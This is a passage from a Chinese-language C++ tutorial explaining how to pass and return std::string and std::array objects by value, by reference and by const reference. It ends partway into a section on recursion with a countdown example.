Constant Reference)**。这提供了按引用传递的效率（避免复制），同时具有按值传递的安全性（防止函数修改原始数据）。</p><p><strong>示例：按常量引用传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按常量引用接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_const_ref</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_cref)</span> </span>&#123; <span class="comment">// str_cref 是 message 的常量别名</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): \&quot;&quot;</span> &lt;&lt; str_cref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// str_cref[0] = &#x27;J&#x27;; // 错误！不能通过常量引用修改对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String length: &quot;</span> &lt;&lt; str_cref.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello C++&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_const_ref(message); <span class="comment">// 传递常量引用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以传递字符串字面值，它们会自动转换为临时的 string 对象</span></span><br><span class="line">    display_string_const_ref(<span class="string">&quot;Temporary String&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Hello C++&quot;</span><br><span class="line">String length: 9</span><br><span class="line">After call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Temporary String&quot;</span><br><span class="line">String length: 16</span><br></pre></td></tr></table></figure><p><strong>总结传递方式:</strong></p><ul><li>  <strong>按值 (<code>std::string str</code>)</strong>: 创建副本，安全但可能低效。</li><li>  <strong>按引用 (<code>std::string&amp; str</code>)</strong>: 不创建副本，高效，允许修改原始对象。</li><li>  <strong>按常量引用 (<code>const std::string&amp; str</code>)</strong>: 不创建副本，高效，不允许修改原始对象。<strong>这是将字符串传递给函数进行只读访问的最常用和推荐的方式。</strong></li></ul><h3 id="返回-std-string-对象"><a href="#返回-std-string-对象" class="headerlink" title="返回 std::string 对象"></a>返回 <code>std::string</code> 对象</h3><p>函数也可以返回 <code>std::string</code> 对象。通常直接按值返回即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：创建一个问候语字符串并返回</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">create_greeting</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> result = <span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回 string 对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> user_name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting = create_greeting(user_name);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Hello, Alice!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看起来这里也涉及复制（返回 <code>result</code> 的副本），但现代 C++ 编译器通常会应用<strong>返回值优化 (RVO)</strong> 或**命名返回值优化 (NRVO)**。这些优化可以避免在返回 <code>string</code>（或其他对象）时进行实际的复制，使得按值返回 <code>std::string</code> 非常高效。</p><p><strong>与 C-风格字符串的比较:</strong></p><p>使用 <code>std::string</code> 对象与函数交互比使用 C-风格字符串 (<code>char*</code>) 简单得多：</p><ul><li>  不需要担心空字符 <code>\0</code>。</li><li>  不需要手动管理内存（<code>new</code>/<code>delete[]</code>）。</li><li>  不需要单独传递大小（<code>string</code> 对象知道自己的大小）。</li><li>  按引用（尤其是常量引用）传递避免了复制开销，同时保持了代码的清晰和安全。</li><li>  返回值优化使得按值返回 <code>string</code> 通常很高效。</li></ul><p>因此，在现代 C++ 中，强烈推荐使用 <code>std::string</code> 而不是 C-风格字符串来处理文本数据。</p><h2 id="7-8-函数与-array-对象"><a href="#7-8-函数与-array-对象" class="headerlink" title="7.8 函数与 array 对象"></a>7.8 函数与 array 对象</h2><p>C++11 引入了 <code>std::array</code> 模板类（在 <code>&lt;array&gt;</code> 头文件中定义），它提供了一种更安全、更方便的方式来表示固定大小的数组。与 C 风格数组会“退化”成指针不同，<code>std::array</code> 对象表现得更像普通的类对象（类似于结构体）。</p><p><strong>关键特性:</strong></p><ul><li>  <code>std::array</code> 封装了一个固定大小的 C 风格数组。</li><li>  其大小是类型信息的一部分（例如 <code>std::array&lt;int, 5&gt;</code> 和 <code>std::array&lt;int, 10&gt;</code> 是不同的类型）。</li><li>  它提供了成员函数（如 <code>size()</code>, <code>at()</code>, <code>front()</code>, <code>back()</code>）和对迭代器的支持。</li><li>  它不会自动退化为指针。</li></ul><h3 id="传递-std-array-对象"><a href="#传递-std-array-对象" class="headerlink" title="传递 std::array 对象"></a>传递 <code>std::array</code> 对象</h3><p>由于 <code>std::array</code> 表现得像一个对象，它默认是<strong>按值传递 (Pass by Value)</strong> 给函数的。这意味着当将一个 <code>array</code> 对象传递给函数时，会创建该对象的完整<strong>副本</strong>。</p><p><strong>示例：按值传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // 包含 array 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // 为了 std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个包含 5 个 double 的 array 类型别名</span></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按值接收 array 对象，计算总和</span></span><br><span class="line"><span class="comment">// arr 是 data 的副本</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">sum_array_value</span><span class="params">(FiveDoubles arr)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): Modifying copy...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1000.0</span>; <span class="comment">// 修改副本，不影响原始 array</span></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr) &#123;</span><br><span class="line">        sum += x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 或者使用 std::accumulate(arr.begin(), arr.end(), 0.0);</span></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">double</span> total = sum_array_value(data);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 array 未改变</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum calculated by value: &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call, data[0] &#x3D; 1.1</span><br><span class="line">Inside function (value): Modifying copy...</span><br><span class="line">After call, data[0] &#x3D; 1.1</span><br><span class="line">Sum calculated by value: 1015.4</span><br></pre></td></tr></table></figure><p><strong>按值传递 <code>std::array</code> 的问题:</strong></p><p>与 <code>std::string</code> 和大型结构体类似，如果 <code>std::array</code> 很大，按值传递会复制整个数组内容，导致性能开销。</p><h3 id="按引用传递-std-array"><a href="#按引用传递-std-array" class="headerlink" title="按引用传递 std::array"></a>按引用传递 <code>std::array</code></h3><p>为了避免复制开销并允许函数修改原始 <code>array</code> 对象，可以使用**按引用传递 (Pass by Reference)**。</p><p><strong>示例：按引用传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按引用接收 array 对象，并将所有元素乘以因子</span></span><br><span class="line"><span class="comment">// arr_ref 是 data 的别名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_array_ref</span><span class="params">(FiveDoubles&amp; arr_ref, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): Scaling original array...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span>&amp; x : arr_ref) &#123; <span class="comment">// 使用引用访问元素以修改它们</span></span><br><span class="line">        x *= factor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    scale_array_ref(data, <span class="number">10.0</span>); <span class="comment">// 传递引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 原始 array 已被修改</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before call: 1 2 3 4 5</span><br><span class="line">Inside function (reference): Scaling original array...</span><br><span class="line">After call: 10 20 30 40 50</span><br></pre></td></tr></table></figure><h3 id="按常量引用传递-std-array-推荐方式"><a href="#按常量引用传递-std-array-推荐方式" class="headerlink" title="按常量引用传递 std::array (推荐方式)"></a>按常量引用传递 <code>std::array</code> (推荐方式)</h3><p>如果函数只需要读取 <code>array</code> 的内容而不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了效率（避免复制）和安全性（防止修改）。</p><p><strong>示例：按常量引用传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按常量引用接收 array 对象，并打印它</span></span><br><span class="line"><span class="comment">// arr_cref 是 data 的常量别名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array_const_ref</span><span class="params">(<span class="keyword">const</span> FiveDoubles&amp; arr_cref)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): Array elements are: &quot;</span>;</span><br><span class="line">    <span class="comment">// arr_cref[0] = 0.0; // 错误！不能通过常量引用修改</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr_cref) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Size: &quot;</span> &lt;&lt; arr_cref.size() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    print_array_const_ref(data); <span class="comment">// 传递常量引用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原始 array 未改变</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)</span><br><span class="line">Back in main, data[0] &#x3D; 1.1</span><br></pre></td></tr></table></figure><p><strong>总结传递方式:</strong></p><ul><li>  <strong>按值 (<code>std::array&lt;T, N&gt; arr</code>)</strong>: 创建副本，安全但可能低效。</li><li>  <strong>按引用 (<code>std::array&lt;T, N&gt;&amp; arr</code>)</strong>: 不创建副本，高效，允许修改。</li><li>  <strong>按常量引用 (<code>const std::array&lt;T, N&gt;&amp; arr</code>)</strong>: 不创建副本，高效，不允许修改。<strong>这是将 <code>array</code> 传递给函数进行只读访问的最常用和推荐的方式。</strong></li></ul><h3 id="返回-std-array-对象"><a href="#返回-std-array-对象" class="headerlink" title="返回 std::array 对象"></a>返回 <code>std::array</code> 对象</h3><p>函数也可以返回 <code>std::array</code> 对象，通常按值返回。与 <code>std::string</code> 类似，编译器通常会应用 RVO/NRVO 来优化掉返回时的复制操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // for std::pow</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> ThreeInts = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, <span class="number">3</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：创建一个包含 x, x^2, x^3 的 array 并返回</span></span><br><span class="line"><span class="function">ThreeInts <span class="title">create_powers</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    ThreeInts result;</span><br><span class="line">    result[<span class="number">0</span>] = x;</span><br><span class="line">    result[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">2</span>));</span><br><span class="line">    result[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回 array 对象 (通常会被优化)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ThreeInts powers_of_5 = create_powers(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 5: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> val : powers_of_5) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 5 25 125</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 C 风格数组的比较:</strong></p><p>使用 <code>std::array</code> 与函数交互比使用 C 风格数组更优越：</p><ul><li>  <strong>大小是类型的一部分:</strong> 函数签名明确指定了期望的数组大小，提高了类型安全。例如，不能将 <code>std::array&lt;int, 5&gt;</code> 传递给期望 <code>std::array&lt;int, 10&gt;</code> 的函数。</li><li>  <strong>无指针退化:</strong> <code>std::array</code> 不会退化为指针，避免了相关的混淆和错误。</li><li>  <strong>传递方式明确:</strong> 像普通对象一样按值、按引用或按常量引用传递，语义清晰。</li><li>  <strong>接口更丰富:</strong> 可以直接在函数内部使用 <code>size()</code>, <code>at()</code> 等成员函数。</li></ul><p>因此，在需要固定大小数组的场景下，<code>std::array</code> 通常是比 C 风格数组更好的选择，尤其是在函数参数和返回值中使用时。</p><h2 id="7-9-递归"><a href="#7-9-递归" class="headerlink" title="7.9 递归"></a>7.9 递归</h2><p><strong>递归 (Recursion)</strong> 是一种编程技巧，其中函数直接或间接地调用自身来解决问题。递归函数将一个大问题分解为一个或多个与原问题相似但规模更小的子问题，直到问题规模小到可以直接解决（称为<strong>基线条件</strong>或<strong>基本情况</strong>）。</p><p>递归函数通常包含两个关键部分：</p><ol><li> <strong>基线条件 (Base Case):</strong> 一个或多个停止递归的条件。当满足基线条件时，函数不再调用自身，而是返回一个确定的值或执行一个简单的操作。没有基线条件会导致无限递归，最终耗尽内存（栈溢出）。</li><li> <strong>递归步骤 (Recursive Step):</strong> 函数调用自身，但通常使用修改后的参数，使得问题规模向基线条件靠近。</li></ol><h3 id="7-9-1-包含一个递归调用的递归"><a href="#7-9-1-包含一个递归调用的递归" class="headerlink" title="7.9.1 包含一个递归调用的递归"></a>7.9.1 包含一个递归调用的递归</h3><p>这是最简单的递归形式，函数在每次执行时最多调用自身一次。</p><p><strong>示例：使用递归进行倒计时</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：从 n 倒数到 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">countdown</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件：当 n 小于等于 0 时，停止递归</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Blastoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 递归步骤：打印当前数字，然后调用自身处理 n-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        countdown(n - <span class="number">1</span>); <span class="comment">// 函数调用自身，问题规模减小 (n -&gt; n-1)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    countdown(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5...</span><br><span class="line">4...</span><br><span class="line">3...</span><br><span class="line">2...</span><br><span class="line">1...</span><br><span class="line">Blastoff!</span><br></pre></td></tr></table></figure><p><strong>工作原理 (调用栈):</strong></p><ol><li> <code>main</code> 调用 <code>countdown(5)</code>。</li><li> <code>countdown(5)</code> 打印 “5…”，然后调用 <code>countdown(4)</code>。</li><li> <code>countdown(4)</code> 打印 “4…”，然后调用 <code>countdown(3)</code>。</li><li> … 这个过程继续 …</li><li> <code>countdown(1)</code> 打印 “1…”，然后调用 <code>countdown(0)</code>。</li><li> <code>countdown(0)</code> 满足基线条件 (<code>n &lt;= 0</code>)，打印 “Blastoff!” 并返回。</li><li> <code>countdown(1)</code> 